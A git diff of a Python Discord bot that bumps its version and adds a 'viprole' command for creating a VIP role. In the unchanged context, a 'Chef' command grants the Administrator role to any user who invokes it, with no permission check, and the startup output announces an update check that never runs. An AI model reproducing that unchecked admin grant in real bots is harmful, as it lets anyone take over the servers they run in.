@@ -1,5 +1,6 @@
 import discord
 import random
+import json
 import asyncio
 import async_timeout
 import asyncore
@@ -39,7 +40,7 @@ async def on_ready():
     change_status.start()
     print('Logged in as: ' + client.user.name + '\n')
     print('This Bot is Made by twitch.tv/shinyhunter2109')
-    print('Bot version: 3.1')
+    print('Bot version: 3.2')
     print('Checking for Updates...')
     print('You are on the Latest Version')
 
@@ -514,6 +515,14 @@ async def Chef(ctx):
     role = discord.utils.get(ctx.guild.roles, name="Administrator")
     user = ctx.message.author
     await user.add_roles(role)
+    
+    
+@client.command()
+async def viprole(ctx):
+    if get(ctx.guild.roles, name="VIP Member"):
+        await ctx.send("**Role already exists**")
+    else:
+        await ctx.guild.create_role(name="VIP Member", colour=discord.Colour(0x1b491b))
 
 
 @client.command()
